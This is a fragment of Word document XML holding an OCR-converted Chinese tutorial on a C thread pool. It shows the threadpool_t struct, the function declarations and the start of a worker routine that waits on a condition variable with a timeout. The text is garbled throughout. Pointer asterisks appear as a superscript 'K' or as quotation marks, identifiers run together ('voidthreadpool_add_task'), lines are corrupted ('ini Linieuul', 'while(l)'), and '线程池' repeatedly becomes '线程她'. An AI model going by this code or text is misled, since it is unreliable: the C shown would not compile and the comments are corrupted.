          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃任务队列中下一个任务</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="660" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>}task_t;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="285" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">〃下面是线程她结构体 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>typedef struct threadpool</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="2"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:top w:w="0" w:type="dxa"/>
          <w:left w:w="10" w:type="dxa"/>
          <w:bottom w:w="0" w:type="dxa"/>
          <w:right w:w="10" w:type="dxa"/>
        </w:tblCellMar>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3105"/>
        <w:gridCol w:w="5250"/>
      </w:tblGrid>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="630" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>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t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>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condition_t ready;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
            </w:tcBorders>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>〃状态里</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task_t "first;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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>〃任务队列中第一个任务</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="33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task_t "last;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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>〃任务队列中最后一个任务</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int counter;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>〃线程她口已有线程数</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int idle;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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t xml:space="preserve">〃线程她口 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>kongxi</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>线程数</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int max_threads;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>〃线程池最大线程数</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int quit;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240"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>〃是否退己标志</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="285" w:hRule="exact"/>
          <w:jc w:val="center"/>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}threadpool_t;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:rPr>
                <w:sz w:val="10"/>
                <w:szCs w:val="10"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:after="679" w:line="1" w:lineRule="exact"/>
      </w:pP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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃线程她初始化</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">void threadpool_init(threadpool_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool, int threads);</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃往线程她中加入任务</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>voidthreadpool_add_task(threadpool_t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>,e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>&gt;t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">run)(void </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>arg), void^arg);</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃摧毁线程她</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void threadpool_destroy(threadpool_t pool)；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#endif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>threadpool.c</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include "threadpool.h"</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include &lt;stdlib.h&gt;</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include &lt;stdio.h&gt;</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include &lt;string.h&gt;</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include &lt;errno.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include &lt;time.h&gt;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃创建的线程执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">void </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">thread_routine(void </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>arg)</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struct timespec abstime;</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ini Linieuul;</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printf("thread %d is starting\n", (int)pthread_self());</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 xml:space="preserve">threadpool_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">pool = (threadpool_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>)arg;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while(l)</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540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>timeout = 0;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃访问线程她之前需要加成</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_lock(&amp;pool-&gt; ready)；</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃空闲</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-&gt;idle++;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃等待队列有任务到来或者收到线程她销毁通知</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">while(pool-&gt;first </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">== </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">&amp;&amp; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>!pool-&gt;quit)</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃否则线程阻塞等待</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>printf("thread %d is waiting\n", (int)pthread_self());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃获取从当前时间，并加上等待时间，设置进程的超时睡眠时间</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>clock_gettime(CLOCK_REALTIME</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>&amp;abstime);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>abstime.tv_sec += 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int status;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
